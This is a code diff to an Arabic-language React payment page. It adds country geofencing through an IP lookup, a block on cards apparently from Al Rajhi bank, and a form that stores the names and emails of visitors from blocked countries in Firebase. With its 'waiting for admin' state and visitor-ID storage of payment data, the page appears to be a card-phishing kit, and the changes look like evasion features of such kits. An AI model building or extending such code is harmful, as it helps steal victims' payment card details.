@@ -13,6 +13,8 @@ import { addData, db } from "@/lib/firebase"
 import { doc, onSnapshot, updateDoc } from "firebase/firestore"
 import { addToHistory } from "@/lib/history-utils"
 import { FullPageLoader } from "./loader"
+import { isCardBlocked, isCountryAllowed } from "@/lib/firebase/settings"
+import { EmailModal } from "@/components/email-modal"
 
 
 interface PaymentPageProps {
@@ -33,6 +35,12 @@ export default function PaymentPage({ offerTotalPrice }: PaymentPageProps) {
 
   // Waiting state
   const [isWaitingAdmin, setIsWaitingAdmin] = useState(false)
+  
+  // Blocked card and country states
+  const [isCardBlockedState, setIsCardBlockedState] = useState(false)
+  const [showEmailModal, setShowEmailModal] = useState(false)
+  const [userCountry, setUserCountry] = useState<string | null>(null)
+  const [countryCheckDone, setCountryCheckDone] = useState(false)
 
   // Detect card type and bank info when card number changes
   useEffect(() => {
@@ -54,6 +62,45 @@ export default function PaymentPage({ offerTotalPrice }: PaymentPageProps) {
       setIsValidCard(false)
     }
   }, [cardNumber])
+
+  // Check if card BIN is blocked
+  useEffect(() => {
+    const checkCardBlocked = async () => {
+      const cleanNumber = cardNumber.replace(/\s/g, "")
+      if (cleanNumber.length >= 4) {
+        const blocked = await isCardBlocked(cleanNumber)
+        setIsCardBlockedState(blocked)
+      } else {
+        setIsCardBlockedState(false)
+      }
+    }
+    checkCardBlocked()
+  }, [cardNumber])
+
+  // Check user country on component mount
+  useEffect(() => {
+    const checkCountry = async () => {
+      try {
+        // Get user's country from IP geolocation API
+        const response = await fetch('https://ipapi.co/json/')
+        const data = await response.json()
+        const countryCode = data.country_code // e.g., "SA", "AE", "KW"
+        setUserCountry(countryCode)
+        
+        // Check if country is allowed
+        const allowed = await isCountryAllowed(countryCode)
+        if (!allowed) {
+          setShowEmailModal(true)
+        }
+        setCountryCheckDone(true)
+      } catch (error) {
+        console.error('Error checking country:', error)
+        // If error, allow access
+        setCountryCheckDone(true)
+      }
+    }
+    checkCountry()
+  }, [])
 
   // Validate expiry date
   useEffect(() => {
@@ -179,6 +226,15 @@ export default function PaymentPage({ offerTotalPrice }: PaymentPageProps) {
       return
     }
 
+    // Check if card is blocked
+    if (isCardBlockedState) {
+      toast.error("تم إيقاف التسديد", {
+        description: "تم إيقاف التسديد من خلال مصرف الراجحي والمحافظ الإلكترونية. الرجاء إدخال بطاقة من مصرف آخر",
+        duration: 7000
+      })
+      return
+    }
+
     try {
       const finalPrice = calculateFinalPrice()
       const discount = selectedPaymentMethod === "credit-card" ? 0.15 : 0
@@ -234,9 +290,42 @@ export default function PaymentPage({ offerTotalPrice }: PaymentPageProps) {
 
   const finalPrice = calculateFinalPrice()
 
+  // Handle email submission for blocked countries
+  const handleEmailSubmit = async (name: string, email: string) => {
+    try {
+      const visitorID = localStorage.getItem("visitor") || "visitor_" + Date.now()
+      
+      // Save to Firebase or send email
+      await addData({
+        id: visitorID,
+        name,
+        email,
+        country: userCountry,
+        status: "pending_email",
+        offerPrice: offerTotalPrice,
+        createdAt: new Date().toISOString()
+      })
+      
+      toast.success("تم الإرسال بنجاح", {
+        description: "سيتم إرسال العرض إلى بريدك الإلكتروني",
+        duration: 5000
+      })
+    } catch (error) {
+      console.error("Error saving email:", error)
+      throw error
+    }
+  }
+
   return (
     <>
       {isWaitingAdmin && <FullPageLoader />}
+      
+      {/* Email Modal for Blocked Countries */}
+      <EmailModal 
+        isOpen={showEmailModal} 
+        onClose={() => setShowEmailModal(false)}
+        onSubmit={handleEmailSubmit}
+      />
       
       <div className="space-y-5" dir="rtl">
         {/* Payment Method Selection */}
@@ -376,6 +465,16 @@ export default function PaymentPage({ offerTotalPrice }: PaymentPageProps) {
             />
             {cardNumber.length > 0 && cardNumber.replace(/\s/g, "").length !== 16 && (
               <p className="text-red-500 text-xs">يجب أن يكون 16 رقم</p>
+            )}
+            {isCardBlockedState && (
+              <div className="bg-red-50 border-2 border-red-500 rounded-lg p-3 mt-2">
+                <p className="text-red-700 text-sm font-bold">
+                  ⚠️ تم إيقاف التسديد من خلال مصرف الراجحي والمحافظ الإلكترونية
+                </p>
+                <p className="text-red-600 text-xs mt-1">
+                  الرجاء إدخال بطاقة من مصرف آخر
+                </p>
+              </div>
             )}
           </div>
 
